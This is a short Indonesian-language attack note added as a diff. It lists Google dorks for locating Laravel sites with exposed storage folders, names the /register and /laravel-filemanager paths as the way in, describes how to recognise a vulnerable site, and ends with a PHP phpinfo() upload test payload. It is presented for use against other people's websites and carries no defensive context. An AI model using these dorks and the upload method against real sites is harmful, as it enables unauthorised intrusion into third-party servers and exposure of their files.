@@ -1,0 +1,20 @@
+
+exploit : /register,/filemanager,/laravel-filemanager
+
+Dork :
+inurl:/storage/files/shared/ site:[bebas]
+inurl:/storage/files/shares/ site:[bebas]
+inurl:/storage/images/shares/ site:[bebas]
+inurl:/storage/images/brand/ site:[bebas]
+inurl:/storage/images/product/ site:[bebas]
+inurl:/storage/files/ ext:pdf atau ext:doc
+----------------------------------------------------------------
+Exploit :
+/register 
+/filemanager 
+/laravel-filemanager
+----------------------------------------------------------------
+Ciri-ciri Vuln nya :
+Ada tempat Register & ada filemanager nya
+----------------------------------------------------------------
+<?php phpinfo(); ?>
